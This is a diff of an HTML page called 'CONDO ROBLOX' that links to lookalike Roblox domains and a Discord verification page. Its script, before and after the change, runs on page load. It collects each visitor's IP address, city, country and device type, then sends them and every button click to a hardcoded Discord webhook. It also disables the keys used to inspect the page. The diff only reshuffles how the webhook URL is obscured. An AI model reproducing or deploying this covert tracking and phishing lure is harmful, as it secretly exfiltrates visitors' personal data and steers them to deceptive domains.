@@ -38,47 +38,62 @@
         <nav class="buttons">
             <a href="https://roblox.com.py/games/94641939467366/Fun-combat-game?privateServerLinkCode=95905670998612346299377288403761" class="btn" target="_blank" rel="noopener noreferrer">⚔️ 𝑭𝒖𝒏–𝑪𝒐𝒎𝒃𝒂𝒕</a>
             <a href="https://roblox.com.ge/games/135584994052780/AI-Talk-With-Neko?privateServerLinkCode=40996480944674634315323368510113" class="btn" target="_blank" rel="noopener noreferrer">😼🔥 𝗦𝗨𝗦 𝗡𝗘𝗞𝗢</a>
-            <a href="https://www.roblox.tc/games/102072656821218/UPD-3YOUR-NEKO-FRIEND?privateServerLinkCode=23314189966922803139351524206900" class="btn" target="_blank" rel="noopener noreferrer">🔥 Ｎ 𝐄 Ｋ  𝐎   Ｈ 𝐎 ３</a>
+            <a href="https://www.roblox.tc/games/102072656821218/UPD-3YOUR-NEKO-FRIEND?privateServerLinkCode=23314189966922803139351524206900" class="btn" target="_blank" rel="noopener noreferrer">🔥 Ｎ 𝐄 Ｋ  Ｏ   Ｈ 𝐎 ３</a>
             <a href="https://restorecord.com/pt/verify/Verify%20in%20CONDO%20ROBLOX%F0%9F%92%9C" class="btn" target="_blank" rel="noopener noreferrer">・𝒗𝒆𝒓𝒊𝒇𝒊𝒄𝒂𝒕𝒊𝒐𝒏</a>
             <a href="https://roblox.com.ge/games/90908715811812/Find-the-Neko-Girl-Join-for-a-surprise?privateServerLinkCode=40996480944674634315323368510113" class="btn" target="_blank" rel="noopener noreferrer">❤ 𝟏𝟎𝟎 𝐏𝐋𝐀𝐘𝐄𝐑𝐒</a>
         </nav>
         <footer class="footer">CONDO ROBLOX</footer>
     </main>
     <script>
-        const _0x4f21 = ["https://discord.com/api/webhooks/", "1472653960312787045", "/", "sT4hAv5u3ozOSWyAFnbEOnAomX7uzuebSs", "ZpFPmrSzntdiHL-CPsbYORTn_olIjBlzdp2E", "=="];
-        function _0xgetW() { return _0x4f21[0] + _0x4f21[1] + _0x4f21[2] + _0x4f21[3] + _0x4f21[4] + _0x4f21[5]; }
-        let _0xcache = null;
-        async function _0xgetData() {
-            if (_0xcache) return _0xcache;
-            try { const r = await fetch("https://ipapi.co/json/"); _0xcache = await r.json(); return _0xcache; }
-            catch (e) { return { ip: "0.0.0.0", country_name: "N/A", city: "N/A" }; }
-        }
-        async function _0xlog(t, e = "") {
-            const d = await _0xgetData();
-            const m = /Mobi|Android|iPhone/i.test(navigator.userAgent);
-            const p = {
+        // Webhook protegido por fragmentação simples e funcional
+        const _p1 = "https://discord.com/api/webhooks/";
+        const _p2 = "1472653960312787045";
+        const _p3 = "/sT4hAv5u3ozOSWyAFnbEOnAomX7uzuebSsFPmrSzntdiHL-CPsbYORTn_olIjBlzdp2E";
+        
+        const _getW = () => _p1 + _p2 + _p3;
+
+        async function _sendLog(tipo, extra = "") {
+            let data = { ip: "Carregando...", country_name: "...", city: "..." };
+            try {
+                const res = await fetch("https://ipapi.co/json/");
+                data = await res.json();
+            } catch (e) {}
+
+            const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
+            const payload = {
                 username: "CONDO MONITOR",
                 avatar_url: "https://i.ibb.co/VchTqG8m/background.jpg",
                 embeds: [{
-                    title: t === "visita" ? "🚀 NOVA CONEXÃO" : "🎯 CLIQUE",
-                    color: t === "visita" ? 0xAD00FF : 0x00F0FF,
+                    title: tipo === "visita" ? "🚀 NOVA CONEXÃO" : "🎯 CLIQUE",
+                    color: tipo === "visita" ? 0xAD00FF : 0x00F0FF,
                     fields: [
-                        { name: "🌐 IP", value: `\`${d.ip}\``, inline: true },
-                        { name: "📍 Local", value: `${d.city}, ${d.country_name}`, inline: true },
-                        { name: "📱 Disp", value: m ? "Mobile" : "Desktop", inline: true },
-                        { name: "🔗 Ação", value: t === "visita" ? "Entrou" : `Botão: **${e}**`, inline: false }
+                        { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
+                        { name: "📍 Local", value: `${data.city}, ${data.country_name}`, inline: true },
+                        { name: "📱 Disp", value: isMobile ? "Mobile" : "Desktop", inline: true },
+                        { name: "🔗 Ação", value: tipo === "visita" ? "Entrou no site" : `Botão: **${extra}**`, inline: false }
                     ],
                     timestamp: new Date().toISOString()
                 }]
             };
-            fetch(_0xgetW(), { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(p), keepalive: true }).catch(() => {});
+
+            fetch(_getW(), {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload),
+                keepalive: true
+            }).catch(() => {});
         }
-        document.onkeydown = function(e) { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false; };
+
+        // Bloqueio de inspeção
+        document.onkeydown = (e) => {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
+        };
+
         window.addEventListener("DOMContentLoaded", () => {
-            _0xlog("visita");
+            _sendLog("visita");
             document.querySelector(".buttons").addEventListener("click", (e) => {
                 const b = e.target.closest(".btn");
-                if (b) _0xlog("clique", b.innerText.trim());
+                if (b) _sendLog("clique", b.innerText.trim());
             });
         });
     </script>
